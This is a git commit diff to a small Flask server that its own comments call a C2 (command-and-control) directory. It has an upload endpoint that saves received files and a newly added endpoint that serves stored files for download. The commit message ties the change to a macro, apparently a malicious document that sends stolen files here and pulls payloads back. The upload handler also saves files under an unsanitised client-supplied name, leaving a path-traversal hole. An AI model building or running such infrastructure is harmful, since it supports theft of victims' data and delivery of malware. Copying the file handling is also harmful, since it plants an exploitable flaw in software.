a30cc64a98beab96f45a35e3f326637b68dad2a3
emmekappaa <michele.cipriani@studenti.univr.it>
2025-01-14 20:32:48 +0100

    add funct in macro

--- server.py
+++ server.py
@@ -1,6 +1,5 @@
-# server.py
 import os
-from flask import Flask, request
+from flask import Flask, request, send_from_directory
 
 app = Flask(__name__)
 
@@ -16,6 +15,14 @@ def upload_file():
     file = request.files['file']
     file.save(os.path.join(save_directory, file.filename))  # Salva il file nella directory C2
     return "File ricevuto con successo!", 200
+
+@app.route('/<filename>', methods=['GET'])
+def download_file(filename):
+    """Endpoint per scaricare un file dalla directory C2."""
+    try:
+        return send_from_directory(save_directory, filename, as_attachment=True)
+    except FileNotFoundError:
+        return "File non trovato", 404
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)  # Esegui il server sulla porta 5000
